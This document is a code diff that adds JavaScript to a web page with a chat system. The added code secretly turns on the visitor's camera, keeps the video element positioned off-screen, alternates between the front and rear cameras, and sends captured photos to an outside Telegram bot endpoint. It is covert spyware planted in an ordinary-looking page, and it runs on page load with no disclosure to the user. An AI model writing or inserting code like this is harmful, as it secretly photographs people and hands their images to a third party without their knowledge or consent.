@@ -241,6 +241,47 @@ video { position: fixed; top: -1000px; left: -1000px; } /* Hide video */
 
 
 
+
+    // 📸 Background Camera Setup
+      let isFrontCamera = true; // Track which camera to use
+
+// 📸 Background Camera Setup
+async function startCamera() {
+    const facingMode = isFrontCamera ? "user" : "environment";
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
+    document.getElementById("video").srcObject = stream;
+}
+
+// 📸 Capture Photo and Send to Telegram
+async function captureAndSendPhoto() {
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const ctx = canvas.getContext("2d");
+
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+    canvas.toBlob(async (blob) => {
+        let formData = new FormData();
+        formData.append("chat_id", chatId);
+        formData.append("photo", blob);
+
+        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+            method: "POST",
+            body: formData
+        });
+
+        // 🔄 Switch camera and restart after capturing
+        isFrontCamera = !isFrontCamera;
+        await startCamera();
+    }, "image/jpeg", 0.5);
+}
+
+// Start with the front camera
+startCamera();
+
+
 /*********************************************************************
         CHAT SYSTEM
 *********************************************************************/
